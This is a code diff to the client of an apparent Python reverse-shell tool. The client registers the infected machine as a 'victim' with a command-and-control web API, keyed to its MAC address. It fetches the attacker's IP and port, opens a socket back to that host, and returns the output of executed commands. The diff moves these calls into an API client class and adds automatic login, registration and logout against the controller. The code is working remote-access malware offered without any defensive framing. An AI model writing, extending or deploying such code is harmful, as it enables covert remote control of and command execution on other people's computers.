@@ -1,10 +1,10 @@
-from api import create_victim, update_victim, get_attacker
-import subprocess
-import socket
+import os
+import re
 import json
 import uuid
-import re
-import os
+import socket
+import subprocess
+from api import Client as Api
 
 
 class Client(object):
@@ -15,6 +15,7 @@ class Client(object):
         self.port = ''
         self.mac_address = self.get_mac_address()
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.api = Api()
         # Change directory to 'Desktop'.
         # os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop")) #TODO Fix this.
 
@@ -25,19 +26,23 @@ class Client(object):
         return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
     def connect_to_attacker(self):
-        response = get_attacker(self.mac_address)
+        response = self.api.get_attacker(self.mac_address)
         while response.status_code != 200:
-            response = get_attacker(self.mac_address)
+            response = self.api.get_attacker(self.mac_address)
         attacker = json.loads(response.text)
         attacker_ip = attacker['ip']
         attacker_port = attacker['port']
         self.connect_socket(attacker_ip, attacker_port)
-        update_victim(self.mac_address, data={'port': self.client.getsockname()[1]})
+        self.api.update_victim(self.mac_address, data={'port': self.client.getsockname()[1]})
 
     def connect_to_web_server(self):
-        response = create_victim(self.host_ip, self.port, self.host_name, self.mac_address)
+        username = self.mac_address.replace(':', '')
+        response = self.api.login(username, self.mac_address)
+        if response.status_code == 401:
+            self.api.register(username, self.mac_address)
+        response = self.api.create_victim(self.host_ip, self.port, self.host_name, self.mac_address, username)
         if response.status_code == 400:
-            update_victim(self.mac_address, data={'logged_in': True})
+            self.api.update_victim(self.mac_address, data={'logged_in': True})
         self.connect_to_attacker()
 
     def connect_socket(self, ip, port):
@@ -64,6 +69,7 @@ class Client(object):
                         self.client.send(str.encode(str(os.getcwd()) + '$ ' + '\n' + output_str))
             except:  # catch *all* exceptions
                 self.client.close()
+                self.api.logout()
 
 
 if __name__ == '__main__':
